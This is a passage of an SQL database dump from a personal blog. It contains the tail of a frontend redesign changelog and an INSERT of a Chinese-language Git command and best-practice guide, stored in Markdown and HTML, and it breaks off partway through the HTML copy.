<li>副标题：朋克打字机效果 + 闪烁光标</li>\n  <li>加载更多按钮：朋克数据流风格（边框呼吸、流光扫过、数据流动画）</li>\n  <li>Hover 状态配色优化：纯白文字 + 青色发光 + 多层阴影</li>\n</ul>\n<p><strong>3. 自定义光标优化</strong></p>\n<ul>\n  <li>外圈：默认青色(#00f0ff) / Hover玫红色(#ff003c)</li>\n  <li>内点：纯白色 + 发光效果</li>\n  <li>所有状态添加 box-shadow 增强可见性</li>\n</ul>\n<p><strong>4. 标题空格修复</strong></p>\n<ul>\n  <li>&quot;LILICOULD\'S BLOG&quot; 中间空格显示优化</li>\n</ul>\n<h3 id=\"动画系统升级\">动画系统升级</h3>\n<p><strong>1. anime.js 升级到 v4.4.1</strong></p>\n<ul>\n  <li>HomeView.vue：使用 createTimeline + animate + stagger 新 API</li>\n  <li>ArticleCard.vue：animate() 替代 anime()</li>\n  <li>AppSidebar.vue：同上</li>\n  <li>useHeroCarousel.ts：同上</li>\n  <li>修复 v4 API 兼容问题（onComplete、alternate 等）</li>\n</ul>\n<p><strong>2. 动画细节修复</strong></p>\n<ul>\n  <li>统计数字动画：Math.round() 修复小数撑爆盒子问题</li>\n  <li>TypeScript 编译错误修复（非空断言等）</li>\n</ul>\n<h3 id=\"性能优化\">性能优化</h3>\n<p><strong>1. 移除无用依赖</strong></p>\n<ul>\n  <li>echarts（未使用，减少 1.2MB）</li>\n  <li>v-viewer / viewerjs（未使用，减少 100KB）</li>\n</ul>\n<p><strong>2. 按需加载</strong></p>\n<ul>\n  <li>Element Plus 改为按需导入（减少 ~500KB）</li>\n  <li>FilePreview.vue：@vue-office 系列组件动态导入</li>\n  <li>ChatRoomView.vue：同上</li>\n</ul>\n<p><strong>3. 效果</strong></p>\n<ul>\n  <li>首屏大小：~2-3MB → ~500KB（提升 80%）</li>\n  <li>加载时间(1Mbps)：~12秒 → ~2.4秒</li>\n</ul>\n<h3 id=\"bug-修复\">Bug 修复</h3>\n<ol>\n  <li>defineAsyncComponent 导入来源错误（vue-router → vue）</li>\n  <li>Element Plus 运行时初始化错误（移除 manualChunks 配置）</li>\n  <li>副标题不显示问题（opacity 修复）</li>\n  <li>TypeScript 类型错误修复</li>\n</ol>\n<hr />\n<h2 id=\"修改文件清单\">修改文件清单</h2>\n<table>\n  <thead>\n    <tr><th>文件</th><th>修改内容</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>package.json</td><td>移除 echarts, v-viewer, viewerjs；升级 animejs 到 v4</td></tr>\n    <tr><td>main.ts</td><td>移除 Element Plus 完整导入</td></tr>\n    <tr><td>vite.config.ts</td><td>简化构建配置</td></tr>\n    <tr><td>src/assets/styles/variables.css</td><td>设计系统重建（温暖橙色调）</td></tr>\n    <tr><td>src/components/layout/AppHeader.vue</td><td>SVG 图标替换、删除冗余 CSS</td></tr>\n    <tr><td>src/components/layout/AppFooter.vue</td><td>SVG 图标替换</td></tr>\n    <tr><td>src/components/layout/AppSidebar.vue</td><td>anime.js v4 迁移、统计数字修复</td></tr>\n    <tr><td>src/components/common/ArticleCard.vue</td><td>anime.js v4 迁移</td></tr>\n    <tr><td>src/components/common/CustomCursor.vue</td><td>赛博朋克配色优化</td></tr>\n    <tr><td>src/views/home/HomeView.vue</td><td>Glitch 效果、打字机效果、加载按钮重构、标题空格、anime.js v4</td></tr>\n    <tr><td>src/views/preview/FilePreview.vue</td><td>动态导入、导入来源修复</td></tr>\n    <tr><td>src/views/chat/ChatRoomView.vue</td><td>动态导入</td></tr>\n    <tr><td>src/composables/useHeroCarousel.ts</td><td>anime.js v4 迁移</td></tr>\n  </tbody>\n</table>\n<h2 id=\"非常不错的图片\">非常不错的图片</h2>\n<p><img src=\"https://oss.lilicould.cn/file/3d3ad594-5522-469f-8a43-d9545b77b563_hero-1.png\" alt=\"\" /></p>\n', 'https://oss.lilicould.cn/cover/594215e7-bcfc-46da-b684-3c15eb5e6e3e_hero-1.png', 1, 14, 2, '2026-05-01 23:39:31', '2026-05-19 10:19:37', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (75, '实际工作完全指南', 'git-full-guidance', '一份面向日常开发、团队协作的 Git 命令与最佳实践速查手册。  ', '# Git 实际工作完全指南\n\n> 一份面向日常开发、团队协作的 Git 命令与最佳实践速查手册。  \n> **目标**：覆盖工作中 95% 以上的 Git 场景，并给出高效、可复用的操作。\n\n---\n\n## 1. 基础配置（一次搞定）\n\n```bash\ngit config --global user.name \"你的名字\"\ngit config --global user.email \"your.email@example.com\"\ngit config --global core.editor \"vim\"                # 默认编辑器\ngit config --global merge.tool \"vimdiff\"             # 合并工具\ngit config --global pull.rebase false                # 默认 merge（也可设为 true 用 rebase）\ngit config --global init.defaultBranch main          # 默认分支名 main\n```\n\n**查看配置**：`git config --list`\n\n---\n\n## 2. 初始化与克隆\n\n```bash\ngit init                    # 现有项目初始化\ngit clone &lt;url>             # 克隆远程仓库\ngit clone --depth 1 &lt;url>   # 浅克隆（只拿最近一次提交，省空间）\n```\n\n---\n\n## 3. 日常提交流水线\n\n```bash\ngit status                  # 看哪些文件改动\ngit add &lt;file>              # 添加到暂存区\ngit add .                   # 添加所有改动（谨慎，会包括未跟踪文件）\ngit add -p                  # 交互式添加（分块选择，非常推荐）\ngit commit -m \"message\"     # 提交\ngit commit -a -m \"msg\"      # 跳过暂存区，直接提交所有已跟踪文件的改动\n```\n\n**一条命令完成 add + commit**：  \n`git commit -am \"msg\"`（只对已跟踪文件有效，新文件仍需 add）\n\n---\n\n## 4. 同步远程仓库\n\n```bash\ngit fetch                  # 拉取远程更新（不合并）\ngit pull                   # fetch + merge 远程分支\ngit pull --rebase          # fetch + rebase（保持线性历史）\ngit push                   # 推送到远程同名分支\ngit push origin main       # 明确指定远程和分支\ngit push -u origin feature # 第一次推送并建立上游关联（之后直接 git push）\ngit push --force-with-lease # 安全的强制推送（改写历史后）\n```\n\n---\n\n## 5. 分支管理\n\n```bash\ngit branch                 # 本地分支列表\ngit branch -r              # 远程分支列表\ngit branch -a              # 所有分支\ngit branch &lt;name>          # 创建分支（但不切换）\ngit checkout -b &lt;name>     # 创建并切换到新分支（常用）\ngit switch -c &lt;name>       # 新式命令（Git 2.23+）\ngit checkout &lt;name>        # 切换分支\ngit switch &lt;name>          # 新式切换\ngit merge &lt;branch>         # 合并某分支到当前分支\ngit merge --no-ff &lt;branch> # 强制创建合并提交（保留分支历史）\ngit branch -d &lt;name>       # 删除本地分支（已合并）\ngit branch -D &lt;name>       # 强制删除（未合并也删）\ngit push origin --delete &lt;name>  # 删除远程分支\n```\n\n**查看分支合并图**：  \n`git log --graph --pretty=oneline --abbrev-commit`\n\n---\n\n## 6. 撤销与修改历史\n\n### 6.1 还没 push 的撤销\n\n```bash\n# 修改最后一次提交（追加文件、改 message）\ngit add forgotten_file\ngit commit --amend\n\n# 只改最后一次提交的 message\ngit commit --amend -m \"新消息\"\n\n# 撤销暂存区（把文件从 staged 变回 modified）\ngit restore --staged &lt;file>   # 或者 git reset HEAD &lt;file>\n\n# 丢弃工作区的修改（恢复成上一次提交的状态）\ngit restore &lt;file>            # 或者 git checkout -- &lt;file>\ngit restore .                 # 丢弃所有工作区修改\n```\n\n### 6.2 已经 commit 但未 push\n\n```bash\n# 回退到上一个提交（保留工作区修改）\ngit reset --soft HEAD~1\n\n# 回退并撤销暂存（但不删工作区）\ngit reset --mixed HEAD~1     # 等价于 git reset HEAD~1\n\n# 回退并彻底丢弃所有修改（危险）\ngit reset --hard HEAD~1\n```\n\n### 6.3 已经 push\n\n```bash\n# 方法1：使用 revert（安全，生成反向提交）\ngit revert &lt;commit-hash>      # 产生一个新的提交，撤销指定提交的改动\ngit push\n\n# 方法2：reset 后 force push（团队必须协调好）\ngit reset --hard &lt;正确版本hash>\ngit push --force-with-lease   # 比 --force 更安全\n```\n\n---\n\n## 7. 暂存现场（stash）\n\n```bash\ngit stash                    # 暂存当前所有未提交改动\ngit stash push -m \"wip\"      # 带备注的暂存\ngit stash list               # 查看 stash 列表\ngit stash apply              # 应用最新 stash（保留 stash 记录）\ngit stash pop                # 应用并删除最新 stash\ngit stash drop stash@{1}     # 删除指定 stash\ngit stash show -p stash@{0}  # 查看某个 stash 的 diff\n```\n\n**实用场景**：切换分支前，不想提交当前混乱的代码。\n\n---\n\n## 8. 合并冲突解决\n\n### 8.1 发生冲突后\n```bash\ngit status                   # 查看冲突文件\n# 手动编辑文件，删除冲突标记 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ======= >>>>>>>\ngit add &lt;resolved_file>      # 标记已解决\ngit commit                   # 完成合并提交\n```\n\n### 8.2 使用 mergetool\n```bash\ngit mergetool                # 打开配置的合并工具（如 vimdiff, kdiff3）\n```\n\n### 8.3 接受某一方（快速）\n```bash\n# 全部使用当前分支版本\ngit checkout --ours -- &lt;file>\n# 全部使用合并分支版本\ngit checkout --theirs -- &lt;file>\ngit add &lt;file>\n```\n\n### 8.4 rebase 冲突处理\n```bash\ngit rebase --continue        # 解决冲突并 add 后继续\ngit rebase --skip            # 跳过当前提交\ngit rebase --abort           # 放弃 rebase\n```\n\n---\n\n## 9. 日志与比较\n\n### 日志美化\n```bash\ngit log --oneline -10        # 简洁一行，最近10条\ngit log --graph --pretty=format:\'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an>%Creset\' --abbrev-commit\n# 可以设置别名：git config --global alias.lg \"log --graph --pretty=format:\'...\'\"\n```\n\n### 查看改动\n```bash\ngit diff                     # 工作区 vs 暂存区\ngit diff --staged            # 暂存区 vs 上次提交（--cached 相同）\ngit diff HEAD                # 工作区 vs 上次提交\ngit diff &lt;commit1> &lt;commit2> # 两个提交之间的差异\ngit diff main..feature       # 比较两个分支\n```\n\n### 查看某行代码谁写的\n```bash\ngit blame &lt;file> -L 10,20    # 查看第10到20行的历史\n```\n\n### 查找谁删了一行\n```bash\ngit log -S \"关键字\" --source  # 搜索添加/删除该关键字的提交\ngit log -L &lt;start>,&lt;end>:&lt;file>  # 查看文件某段落的演化\n```\n\n---\n\n## 10. 整理提交历史（交互式 rebase）\n\n**前提**：改动尚未 push 到公共分支。\n\n```bash\ngit rebase -i HEAD~3         # 整理最近3次提交\n```\n\n在打开的编辑器中，常见指令：\n- `pick`   – 使用该提交\n- `reword` – 使用但修改 message\n- `edit`   – 停止以便修改内容\n- `squash` – 合并到前一个提交\n- `fixup`  – 类似 squash 但丢弃 message\n- `drop`   – 删除提交\n\n**示例**：把多个临时提交合并成一个干净提交。\n\n---\n\n## 11. 挑选提交（cherry-pick）\n\n将其他分支的某个/某些提交复制到当前分支。\n\n```bash\ngit cherry-pick &lt;commit-hash>      # 单个\ngit cherry-pick &lt;hash1> &lt;hash2>    # 多个\ngit cherry-pick hash1..hash5       # 范围\n```\n\n常见场景：hotfix 分支的某个修复需要同步到 release 分支。\n\n---\n\n## 12. 标签管理（发布版本）\n\n```bash\ngit tag                      # 列出所有标签\ngit tag v1.0.0               # 轻量标签\ngit tag -a v1.0.0 -m \"Release 1.0.0\"  # 附注标签\ngit push origin v1.0.0       # 推送单个标签\ngit push origin --tags       # 推送所有标签\ngit tag -d v1.0.0            # 删除本地标签\ngit push origin --delete v1.0.0  # 删除远程标签\n```\n\n---\n\n## 13. 高级查找（bisect 二分定位 bug）\n\n```bash\ngit bisect start\ngit bisect bad               # 当前版本有问题\ngit bisect good v1.0.0       # 已知好版本\n# Git 自动切换到中间提交，测试后标记：\ngit bisect good              # 或 bad\n# 重复直到找到首次引入 bug 的提交\ngit bisect reset             # 结束\n```\n\n---\n\n## 14. 远程仓库管理\n\n```bash\ngit remote -v                # 查看远程地址\ngit remote add upstream &lt;url>   # 添加另一个远程（如 upstream）\ngit fetch upstream           # 拉取上游更新\ngit merge upstream/main      # 合并上游分支\ngit remote remove &lt;name>     # 删除远程\ngit remote rename old new    # 重命名\n```\n\n---\n\n## 15. 子模块\n\n```bash\ngit submodule add &lt;url> path    # 添加子模块\ngit submodule update --init --recursive   # 克隆后初始化并更新\ngit submodule update --remote   # 拉取子模块最新提交\n```\n\n**注意**：主仓库只记录子模块的 commit hash，子模块内部需要单独管理。\n\n---\n\n## 16. 实用别名（大幅提效）\n\n编辑 `~/.gitconfig` 或执行：\n\n```bash\ngit config --global alias.co checkout\ngit config --global alias.br branch\ngit config --global alias.st status\ngit config --global alias.lg \"log --graph --pretty=format:\'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an>%Creset\' --abbrev-commit\"\ngit config --global alias.unstage \"reset HEAD --\"\ngit config --global alias.last \"log -1 HEAD\"\ngit config --global alias.undo \"reset --soft HEAD^\"\ngit config --global alias.pullr \"pull --rebase\"\ngit config --global alias.prune \"remote prune origin\"\ngit config --global alias.tree \"log --graph --oneline --all\"\n```\n\n---\n\n## 17. 常见工作流场景\n\n### 17.1 日常开发（feature 分支）\n```bash\ngit checkout -b feature/xxx main\n# 开发，多次 add/commit\ngit push -u origin feature/xxx   # 发起 PR/MR\n# 合并后删除本地分支：git branch -d feature/xxx\n```\n\n### 17.2 同步 main 分支到 feature\n```bash\ngit fetch origin main\ngit merge origin/main        # 方式1：merge\n# 或\ngit rebase origin/main       # 方式2：rebase（保持线性）\n```\n\n### 17.3 紧急热修复（hotfix）\n```bash\ngit checkout main\ngit checkout -b hotfix/critical\n# 修复并提交\ngit commit -m \"fix critical bug\"\ngit push origin hotfix/critical\n# PR 合并进 main 后，也需合并到 develop 或其他长期分支\n```\n\n### 17.4 回滚某次历史提交（已 push）\n```bash\ngit revert &lt;bad-commit>      # 生成反向提交\ngit push origin main\n```\n\n### 17.5 找回丢失的提交（误删分支、reset --hard）\n```bash\ngit reflog                   # 显示所有 HEAD 移动记录\ngit checkout &lt;commit-hash>   # 找到后检出\ngit branch recover-branch &lt;hash>  # 重新建分支\n```\n\n### 17.6 清空未跟踪文件/目录\n```bash\ngit clean -n                 # 预览会删除哪些\ngit clean -f                 # 删除未跟踪文件\ngit clean -fd                # 删除未跟踪文件和目录\ngit clean -fx                # 包括忽略文件（.gitignore 中的）\n```\n\n### 17.7 合并多个提交后再 push\n```bash\ngit rebase -i HEAD~4         # 合并最近4个\n# 编辑 pick/squash 后保存\ngit push --force-with-lease\n```\n\n---\n\n## 18. Git Hooks（自动化）\n\n位置：`.git/hooks/`（可复制 `.sample` 文件启用）  \n常用钩子：\n- `pre-commit` – 运行 lint、测试、format\n- `commit-msg` – 校验提交信息格式\n- `pre-push` – 推送前运行测试\n\n工具推荐：`husky`（跨平台）、`pre-commit` 框架。\n\n---\n\n## 19. 最佳实践 & 注意事项\n\n| 场景 | 推荐做法 | 避免 |\n|------|----------|------|\n| 提交信息 | 类型(范围): 简述（如 `feat: add login`），体例一致 | 随意乱写 |\n| 分支命名 | `feature/xxx`, `fix/xxx`, `hotfix/xxx`, `chore/xxx` | 无意义名称 |\n| 合并策略 | 公共分支用 merge --no-ff；私有分支可用 rebase | 线性历史强制改写 |\n| 同步远程 | 提交前先 pull --rebase | push 后再 pull 产生 merge 节点 |\n| 强制推送 | 只用 `--force-with-lease` | 直接 `--force` |\n| 大文件 | 使用 Git LFS | 直接提交二进制大文件 |\n| 敏感信息 | 环境变量 / 密码本 | 直接把密钥提交到仓库 |\n\n---\n\n## 20. 一条命令拯救你\n\n```bash\n# 所有修改都弄乱了，只想回到最后一次提交的干净状态\ngit reset --hard HEAD\n\n# 提交错了，想改 message\ngit commit --amend\n\n# 刚刚 git pull 产生了乱七八糟的 merge 节点，想撤销\ngit reset --hard origin/main   # 强制与远程一致\n\n# 清理无效的远程跟踪分支\ngit remote prune origin\n```\n\n---\n\n**结语**：  \n以上覆盖了真实工作中 95% 的 Git 操作。遇到剩下 5% 的诡异问题，首选 `git reflog` 找回状态，再查文档。  ', '<h1 id=\"git-实际工作完全指南\">Git 实际工作完全指南</h1>\n<blockquote>\n  <p>一份面向日常开发、团队协作的 Git 命令与最佳实践速查手册。<br />\n  <strong>目标</strong>：覆盖工作中 95% 以上的 Git 场景，并给出高效、可复用的操作。</p>\n</blockquote>\n<hr />\n<h2 id=\"1-基础配置一次搞定\">1. 基础配置（一次搞定）</h2>\n<pre><code class=\"language-bash\">git config --global user.name &quot;你的名字&quot;\ngit config --global user.email &quot;your.email@example.com&quot;\ngit config --global core.editor &quot;vim&quot;                # 默认编辑器\ngit config --global merge.tool &quot;vimdiff&quot;             # 合并工具\ngit config --global pull.rebase false                # 默认 merge（也可设为 true 用 rebase）\ngit config --global init.defaultBranch main          # 默认分支名 main\n</code></pre>\n<p><strong>查看配置</strong>：<code>git config --list</code></p>\n<hr />\n<h2 id=\"2-初始化与克隆\">2. 初始化与克隆</h2>\n<pre><code class=\"language-bash\">git init                    # 现有项目初始化\ngit clone &amp;lt;url&gt;             # 克隆远程仓库\ngit clone --depth 1 &amp;lt;url&gt;   # 浅克隆（只拿最近一次提交，省空间）\n</code></pre>\n<hr />\n<h2 id=\"3-日常提交流水线\">3. 日常提交流水线</h2>\n<pre><code class=\"language-bash\">git status                  # 看哪些文件改动\ngit add &amp;lt;file&gt;              # 添加到暂存区\ngit add .                   # 添加所有改动（谨慎，会包括未跟踪文件）\ngit add -p                  # 交互式添加（分块选择，非常推荐）\ngit commit -m &quot;message&quot;     # 提交\ngit commit -a -m &quot;msg&quot;      # 跳过暂存区，直接提交所有已跟踪文件的改动\n</code></pre>\n<p><strong>一条命令完成 add + commit</strong>：<br />\n<code>git commit -am &quot;msg&quot;</code>（只对已跟踪文件有效，新文件仍需 add）</p>\n<hr />\n<h2 id=\"4-同步远程仓库\">4. 同步远程仓库</h2>\n<pre><code class=\"language-bash\">git fetch                  # 拉取远程更新（不合并）\ngit pull                   # fetch + merge 远程分支\ngit pull --rebase          # fetch + rebase（保持线性历史）\ngit push                   # 推送到远程同名分支\ngit push origin main       # 明确指定远程和分支\ngit push -u origin feature # 第一次推送并建立上游关联（之后直接 git push）\ngit push --force-with-lease # 安全的强制推送（改写历史后）\n</code></pre>\n<hr />\n<h2 id=\"5-分支管理\">5. 分支管理</h2>\n<pre><code class=\"language-bash\">git branch                 # 本地分支列表\ngit branch -r              # 远程分支列表\ngit branch -a              # 所有分支\ngit branch &amp;lt;name&gt;          # 创建分支（但不切换）\ngit checkout -b &amp;lt;name&gt;     # 创建并切换到新分支（常用）\ngit switch -c &amp;lt;name&gt;       # 新式命令（Git 2.23+）\ngit checkout &amp;lt;name&gt;        # 切换分支\ngit switch &amp;lt;name&gt;          # 新式切换\ngit merge &amp;lt;branch&gt;         # 合并某分支到当前分支\ngit merge --no-ff &amp;lt;branch&gt; # 强制创建合并提交（保留分支历史）\ngit branch -d &amp;lt;name&gt;       # 删除本地分支（已合并）\ngit branch -D &amp;lt;name&gt;       # 强制删除（未合并也删）\ngit push origin --delete &amp;lt;name&gt;  # 删除远程分支\n</code></pre>\n<p><strong>查看分支合并图</strong>：<br />\n<code>git log --graph --pretty=oneline --abbrev-commit</code></p>\n<hr />\n<h2 id=\"6-撤销与修改历史\">6. 撤销与修改历史</h2>\n<h3 id=\"61-还没-push-的撤销\">6.1 还没 push 的撤销</h3>\n<pre><code class=\"language-bash\"># 修改最后一次提交（追加文件、改 message）\ngit add forgotten_file\ngit commit --amend\n\n# 只改最后一次提交的 message\ngit commit --amend -m &quot;新消息&quot;\n\n# 撤销暂存区（把文件从 staged 变回 modified）\ngit restore --staged &amp;lt;file&gt;   # 或者 git reset HEAD &amp;lt;file&gt;\n\n# 丢弃工作区的修改（恢复成上一次提交的状态）\ngit restore &amp;lt;file&gt;            # 或者 git checkout -- &amp;lt;file&gt;\ngit restore .                 # 丢弃所有工作区修改\n</code></pre>\n<h3 id=\"62-已经-commit-但未-push\">6.2 已经 commit 但未 push</h3>\n<pre><code class=\"language-bash\"># 回退到上一个提交（保留工作区修改）\ngit reset --soft HEAD~1\n\n# 回退并撤销暂存（但不删工作区）\ngit reset --mixed HEAD~1     # 等价于 git reset HEAD~1\n\n# 回退并彻底丢弃所有修改（危险）\ngit reset --hard HEAD~1\n</code></pre>\n<h3 id=\"63-已经-push\">6.3 已经 push</h3>\n<pre><code class=\"language-bash\"># 方法1：使用 revert（安全，生成反向提交）\ngit revert &amp;lt;commit-hash&gt;      # 产生一个新的提交，撤销指定提交的改动\ngit push\n\n# 方法2：reset 后 force push（团队必须协调好）\ngit reset --hard &amp;lt;正确版本hash&gt;\ngit push --force-with-lease   # 比 --force 更安全\n</code></pre>\n<hr />\n<h2 id=\"7-暂存现场stash\">7. 暂存现场（stash）</h2>\n<pre><code class=\"language-bash\">git stash                    # 暂存当前所有未提交改动\ngit stash push -m &quot;wip&quot;      # 带备注的暂存\ngit stash list               # 查看 stash 列表\ngit stash apply              # 应用最新 stash（保留 stash 记录）\ngit stash pop                # 应用并删除最新 stash\ngit stash drop stash@{1}     # 删除指定 stash\ngit stash show -p stash@{0}  # 查看某个 stash 的 diff\n</code></pre>\n<p><strong>实用场景</strong>：切换分支前，不想提交当前混乱的代码。</p>\n<hr />\n<h2 id=\"8-合并冲突解决\">8. 合并冲突解决</h2>\n<h3 id=\"81-发生冲突后\">8.1 发生冲突后</h3>\n<pre><code class=\"language-bash\">git status                   # 查看冲突文件\n# 手动编辑文件，删除冲突标记 &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; ======= &gt;&gt;&gt;&gt;&gt;&gt;&gt;\ngit add &amp;lt;resolved_file&gt;      # 标记已解决\ngit commit                   # 完成合并提交\n</code></pre>\n<h3 id=\"82-使用-mergetool\">8.2 使用 mergetool</h3>\n<pre><code class=\"language-bash\">git mergetool                # 打开配置的合并工具（如 vimdiff, kdiff3）\n</code></pre>\n<h3 id=\"83-接受某一方快速\">8.3 接受某一方（快速）</h3>\n<pre><code class=\"language-bash\"># 全部使用当前分支版本\ngit checkout --ours -- &amp;lt;file&gt;\n# 全部使用合并分支版本\ngit checkout --theirs -- &amp;lt;file&gt;\ngit add &amp;lt;file&gt;\n</code></pre>\n<h3 id=\"84-rebase-冲突处理\">8.4 rebase 冲突处理</h3>\n<pre><code class=\"language-bash\">git rebase --continue        # 解决冲突并 add 后继续\ngit rebase --skip            # 跳过当前提交\ngit rebase --abort           # 放弃 rebase\n</code></pre>\n<hr />\n<h2 id=\"9-日志与比较\">9. 日志与比较</h2>\n<h3 id=\"日志美化\">日志美化</h3>\n<pre><code class=\"language-bash\">git log --oneline -10        # 简洁一行，最近10条\ngit log --graph --pretty=format:\'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&amp;lt;%an&gt;%Creset\' --abbrev-commit\n# 可以设置别名：git config --global alias.lg &quot;log --graph --pretty=format:\'...\'&quot;\n</code></pre>\n<h3 id=\"查看改动\">查看改动</h3>\n<pre><code class=\"language-bash\">git diff                     # 工作区 vs 暂存区\ngit diff --staged            # 暂存区 vs 上次提交（--cached 相同）\ngit diff HEAD                # 工作区 vs 上次提交\ngit diff &amp;lt;commit1&gt; &amp;lt;commit2&gt; # 两个提交之间的差异\ngit diff main..feature       # 比较两个分支\n</code></pre>\n<h3 id=\"查看某行代码谁写的\">查看某行代码谁写的</h3>\n<pre><code class=\"language-bash\">git blame &amp;lt;file&gt; -L 10,20    # 查看第10到20行的历史\n</code></pre>\n<h3 id=\"查找谁删了一行\">查找谁删了一行</h3>\n<pre><code class=\"language-bash\">git log -S &quot;关键字&quot; --source  # 搜索添加/删除该关键字的提交\ngit log -L &amp;lt;start&gt;,&amp;lt;end&gt;:&amp;lt;file&gt;  # 查看文件某段落的演化\n</code></pre>\n<hr />\n<h2 id=\"10-整理提交历史交互式-rebase\">10. 整理提交历史（交互式 rebase）</h2>\n<p><strong>前提</strong>：改动尚未 push 到公共分支。</p>\n<pre><code class=\"language-bash\">git rebase -i HEAD~3         # 整理最近3次提交\n</code></pre>\n<p>在打开的编辑器中，常见指令：</p>\n<ul>\n  <li><code>pick</code>   – 使用该提交</li>\n  <li><code>reword</code> – 使用但修改 message</li>\n  <li><code>edit</code>   – 停止以便修改内容</li>\n  <li><code>squash</code> – 合并到前一个提交</li>\n  <li><code>fixup</code>  – 类似 squash 但丢弃 message</li>\n  <li><code>drop</code>   – 删除提交</li>\n</ul>\n<p><strong>示例</strong>：把多个临时提交合并成一个干净提交。</p>\n<hr />\n<h2 id=\"11-挑选提交cherry-pick\">11. 挑选提交（cherry-pick）</h2>\n<p>将其他分支的某个/某些提交复制到当前分支。</p>\n<pre><code class=\"language-bash\">git cherry-pick &amp;lt;commit-hash&gt;      # 单个\ngit cherry-pick &amp;lt;hash1&gt; &amp;lt;hash2&gt;    # 多个\ngit cherry-pick hash1..hash5       # 范围\n</code></pre>\n<p>常见场景：hotfix 分支的某个修复需要同步到 release 分支。</p>\n<hr />\n<h2 id=\"12-标签管理发布版本\">12. 标签管理（发布版本）</h2>\n<pre><code class=\"language-bash\">git tag                      # 列出所有标签\ngit tag v1.0.0               # 轻量标签\ngit tag -a v1.0.0 -m &quot;Release 1.0.0&quot;  # 附注标签\ngit push origin v1.0.0       # 推送单个标签\ngit push origin --tags       # 推送所有标签\ngit tag -d v1.0.0            # 删除本地标签\ngit push origin --delete v1.0.0  # 删除远程标签\n</code></pre>\n<hr />\n<h2 id=\"13-高级查找bisect-二分定位-bug\">13. 高级查找（bisect 二分定位 bug）</h2>\n<pre><code class=\"language-bash\">git bisect start\ngit bisect bad               # 当前版本有问题\ngit bisect good v1.0.0       # 已知好版本\n# Git 自动切换到中间提交，测试后标记：\ngit bisect good              # 或 bad\n# 重复直到找到首次引入 bug 的提交\ngit bisect reset             # 结束\n</code></pre>\n<hr />\n<h2 id=\"14-远程仓库管理\">14. 远程仓库管理</h2>\n<pre><code class=\"language-bash\">git remote -v                # 查看远程地址\ngit remote add upstream &amp;lt;url&gt;   # 添加另一个远程（如 upstream）\ngit fetch upstream           # 拉取上游更新\ngit merge upstream/main      # 合并上游分支\ngit remote remove &amp;lt;name&gt;     # 删除远程\ngit remote rename old new    # 重命名\n</code></pre>\n<hr />\n<h2 id=\"15-子模块\">15. 子模块</h2>\n<pre><code class=\"language-bash\">git submodule add &amp;lt;url&gt; path    # 添加子模块\ngit submodule update --init --recursive   # 克隆后初始化并更新\ngit submodule update --remote   # 拉取子模块最新提交\n</code></pre>\n<p><strong>注意</strong>：主仓库只记录子模块的 commit hash，子模块内部需要单独管理。</p>\n<hr />\n<h2 id=\"16-实用别名大幅提效\">16. 实用别名（大幅提效）</h2>\n<p>编辑 <code>~/.gitconfig</code> 或执行：</p>\n<pre><code class=\"language-bash\">git config --global alias.co checkout\ngit config --global alias.br branch\ngit config --global alias.st status\ngit config --global alias.lg &quot;log --graph --pretty=format:\'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&amp;lt;%an&gt;%Creset\' --abbrev-commit&quot;\ngit config --global alias.unstage &quot;reset HEAD --&quot;\ngit config --global alias.last &quot;log -1 HEAD&quot;\ngit config --global alias.undo &quot;reset --soft HEAD^&quot;\ngit config --global alias.pullr &quot;pull --rebase&quot;\ngit config --global alias.prune &quot;remote prune origin&quot;\ngit config --global alias.tree &quot;log --graph --oneline --all&quot;\n</code></pre>\n<hr />\n<h2 id=\"17-常见工作流场景\">17. 常见工作流场景</h2>\n<h3 id=\"171-日常开发feature-分支\">17.1 日常开发（feature 分支）</h3>\n<pre><code class=\"language-bash\">git checkout -b feature/xxx main\n# 开发，多次 add/commit\ngit push -u origin feature/xxx   # 发起 PR/MR\n# 合并后删除本地分支：git branch -d feature/xxx\n</code></pre>\n<h3 id=\"172-同步-main-分支到-feature\">17.2 同步 main 分支到 feature</h3>\n<pre><code class=\"language-bash\">git fetch origin main\ngit merge origin/main        # 方式1：merge\n# 或\ngit rebase origin/main       # 方式2：rebase（保持线性）\n</code></pre>\n<h3 id=\"173-紧急热修复hotfix\">17.3 紧急热修复（hotfix）</h3>\n<pre><code class=\"language-bash\">git checkout main\ngit checkout -b hotfix/critical\n# 修复并提交\ngit commit -m &quot;fix critical bug&quot;\ngit push origin hotfix/critical\n# PR 合并进 main 后，也需合并到 develop 或其他长期分支\n</code></pre>\n<h3 id=\"174-回滚某次历史提交已-push\">17.4 回滚某次历史提交（已 push）</h3>\n<pre><code class=\"language-bash\">git revert &amp;lt;bad-commit&gt;      # 生成反向提交\ngit push origin main\n</code></pre>\n<h3 id=\"175-找回丢失的提交误删分支reset---hard\">17.5 找回丢失的提交（误删分支、reset --hard）</h3>\n<pre><code class=\"language-bash\">git reflog                   # 显示所有 HEAD 移动记录\ngit checkout &amp;lt;commit-hash&gt;   # 找到后检出\ngit branch recover-branch &amp;lt;hash&gt;  # 重新建分支\n</code></pre>\n<h3 id=\"176-清空未跟踪文件目录\">17.6 清空未跟踪文件/目录</h3>\n<pre><code class=\"language-bash\">git clean -n                 # 预览会删除哪些\ngit clean -f                 # 删除未跟踪文件\ngit clean -fd                # 删除未跟踪文件和目录\ngit clean -fx                # 包括忽略文件（.gitignore 中的）\n</code></pre>\n<h3 id=\"177-合并多个提交后再-push\">17.7 合并多个提交后再 push</h3>\n<pre><code class=\"language-bash\">git rebase -i HEAD~4         # 合并最近4个\n# 编辑 pick/squash 后保存\ngit push --force-with-lease\n</code></pre>\n<hr />\n<h2 id=\"18-git-hooks自动化\">18. Git Hooks（自动化）</h2>\n<p>位置：<code>.git/hooks/</code>（可复制 <code>.sample</code> 文件启用）<br />\n常用钩子：</p>\n<ul>\n  <li><code>pre-commit</code> – 运行 lint、测试、format</li>\n  